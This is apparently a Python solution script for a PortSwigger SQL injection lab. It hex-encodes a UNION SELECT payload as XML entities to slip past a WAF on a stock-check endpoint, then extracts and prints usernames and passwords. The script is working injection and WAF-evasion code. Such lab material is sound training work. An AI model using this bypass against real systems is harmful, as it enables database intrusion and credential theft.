# Lab 18 — SQL Injection: Filter Bypass via XML Encoding
# PortSwigger: https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
#
# Vulnerability: Stock check feature — XML POST body
# Aim:           Retrieve admin credentials from the users table, log in
#
# WAF behaviour:
#   A WAF sits in front of the app and blocks requests containing SQL keywords
#   (UNION, SELECT, etc.) and the single quote character.
#
# Bypass technique — XML hex entity encoding:
#   XML supports hex character references: &#x55; = U, &#x4e; = N, &#x27; = ' etc.
#   The WAF checks the raw request bytes — it sees &#x55;&#x4e;... and finds no keyword.
#   The backend XML parser decodes the entities before the string reaches SQL.
#   The DB then receives perfectly valid SQL.
#
#   WAF sees:  &#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;...   ← gibberish, passes
#   DB sees:   1 UNION SELECT username||'~'||password FROM users  ← executes
#
# NOTE: &apos; / &lt; / &gt; (named XML entities) do NOT bypass this WAF.
#       Hex entities (&#xNN;) are required.
#
# Usage: python lab18.py <url>

import sys
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

STOCK_PATH = "product/stock"


def hex_encode(text):
    """
    Encode every character as an XML hex entity reference.
    e.g. 'A' → '&#x41;'  |  ' → '&#x27;'  |  space → '&#x20;'

    This hides SQL keywords and special characters from the WAF while
    remaining fully decodable by the XML parser on the backend.
    """
    return "".join(f"&#x{ord(c):02x};" for c in text)


if __name__ == "__main__":
    banner()
    section("LAB 18 — XML ENCODING WAF BYPASS")

    if len(sys.argv) != 2:
        print("  Usage: python lab18.py <url>")
        sys.exit(1)

    url     = sys.argv[1].rstrip("/") + "/"
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    # The raw SQLi payload — WAF would block this if sent plaintext
    raw_payload = "1 UNION SELECT username||'~'||password FROM users"

    # Hex-encode the entire payload to hide it from the WAF
    encoded_payload = hex_encode(raw_payload)

    print(f"  Raw payload:     {raw_payload}")
    print(f"  Encoded payload: {encoded_payload[:60]}...\n")

    # Wrap in the XML body the stock check endpoint expects
    xml_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<stockCheck>"
        "<productId>1</productId>"
        f"<storeId>{encoded_payload}</storeId>"
        "</stockCheck>"
    )

    response = session.post(
        url + STOCK_PATH,
        data=xml_body,
        headers={"Content-Type": "application/xml"},
    )

    print(f"  {'✔' if response.status_code == 200 else '✘'}  [{response.status_code}]")

    if response.status_code == 200 and "~" in response.text:
        # Credentials are returned in the response body as "username~password"
        print("\n  ★  Credentials found in response:")
        for line in response.text.splitlines():
            if "~" in line:
                user, pwd = line.strip().split("~", 1)
                print(f"     Username: {user}")
                print(f"     Password: {pwd}")
    elif response.status_code == 403:
        print("\n  ✘  WAF blocked the request — encoding may need adjustment.")
    else:
        print("\n  Response body:")
        print(response.text[:500])
